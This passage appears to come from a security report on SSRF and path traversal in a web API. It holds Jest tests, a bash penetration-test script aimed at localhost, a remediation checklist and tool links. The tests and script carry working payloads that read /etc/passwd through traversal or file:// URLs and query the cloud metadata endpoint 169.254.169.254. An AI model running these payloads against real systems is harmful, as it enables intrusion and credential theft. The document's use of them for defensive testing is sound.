    expect(response.body.error).toContain('Protocol not allowed');
  });
});

describe('Path Traversal Prevention', () => {
  test('should prevent directory traversal', async () => {
    const response = await request(app)
      .get('/api/files/../../../../etc/passwd')
      .set('Authorization', `Bearer ${validToken}`);
    
    expect(response.status).toBe(400);
    expect(response.body.error).toContain('Invalid file request');
  });
  
  test('should only serve files from upload directory', async () => {
    const response = await request(app)
      .get('/api/files/..%2f..%2f..%2f..%2fetc%2fpasswd')
      .set('Authorization', `Bearer ${validToken}`);
    
    expect(response.status).toBe(400);
  });
});
```

### Integration Tests

```javascript
describe('SSRF Integration Tests', () => {
  test('should handle DNS rebinding protection', async () => {
    // Mock DNS resolution to return private IP
    const originalLookup = dns.lookup;
    dns.lookup = jest.fn().mockResolvedValue([{ address: '127.0.0.1' }]);
    
    const response = await request(app)
      .post('/api/users/avatar')
      .set('Authorization', `Bearer ${validToken}`)
      .send({
        imageUrl: 'http://evil-domain.com/image.jpg',
        fetchFromUrl: true
      });
    
    expect(response.status).toBe(400);
    expect(response.body.error).toContain('Private IP address not allowed');
    
    // Restore original function
    dns.lookup = originalLookup;
  });
});
```

### Penetration Testing

```bash
#!/bin/bash
# SSRF/LFI penetration test script

echo "Starting SSRF/LFI penetration test..."

TARGET_URL="http://localhost:3000/api"
TOKEN="your_jwt_token_here"

# Test 1: SSRF to localhost
echo "Test 1: SSRF to localhost"
curl -s -X POST "$TARGET_URL/users/avatar" \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"imageUrl":"http://localhost:80","fetchFromUrl":true}' | jq .

# Test 2: SSRF to cloud metadata
echo "Test 2: SSRF to cloud metadata"
curl -s -X POST "$TARGET_URL/tasks/import" \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"importUrl":"http://169.254.169.254/latest/meta-data/","format":"json"}' | jq .

# Test 3: LFI via file protocol
echo "Test 3: LFI via file protocol"
curl -s -X POST "$TARGET_URL/users/avatar" \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"imageUrl":"file:///etc/passwd","fetchFromUrl":true}' | jq .

# Test 4: Path traversal
echo "Test 4: Path traversal"
curl -s -H "Authorization: Bearer $TOKEN" \
     "$TARGET_URL/files/../../../../etc/passwd" | head -5

echo "Penetration test completed."
```

## Remediation Checklist

### Immediate Actions (Critical)
- [ ] Implement URL validation and allowlisting
- [ ] Block access to cloud metadata services
- [ ] Disable file protocol support
- [ ] Add path traversal protection
- [ ] Implement network-level blocking of private IPs

### Short-term Actions (High Priority)
- [ ] Add comprehensive input validation
- [ ] Implement secure file serving mechanisms
- [ ] Set up network monitoring for SSRF attempts
- [ ] Add rate limiting to prevent automated attacks
- [ ] Configure Web Application Firewall (WAF) rules

### Long-term Actions (Medium Priority)
- [ ] Regular penetration testing
- [ ] Security awareness training for developers
- [ ] Implement zero-trust network architecture
- [ ] Regular security audits and assessments
- [ ] Establish incident response procedures

## Additional Resources

### Tools and Frameworks
- [SSRFmap](https://github.com/swisskyrepo/SSRFmap) - SSRF exploitation tool
- [Gopherus](https://github.com/tarunkant/Gopherus) - Gopher protocol exploitation
- [OWASP ZAP](https://owasp.org/www-project-zap/) - Web application security scanner
- [Burp Suite](https://portswigger.net/burp) - Web application security testing

### Documentation and Standards
- [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [CWE-918: Server-Side Request Forgery](https://cwe.mitre.org/data/definitions/918.html)
- [CWE-22: Path Traversal](https://cwe.mitre.org/data/definitions/22.html)
- [AWS Security Best Practices](https://aws.amazon.com/security/security-resources/)

### Training Resources
- [PortSwigger SSRF Labs](https://portswigger.net/web-security/ssrf) - Interactive SSRF training
- [OWASP WebGoat](https://owasp.org/www-project-webgoat/) - Hands-on security learning
- [HackerOne SSRF Reports](https://hackerone.com/reports?keyword=ssrf) - Real-world SSRF examples

> Prepared by haseeb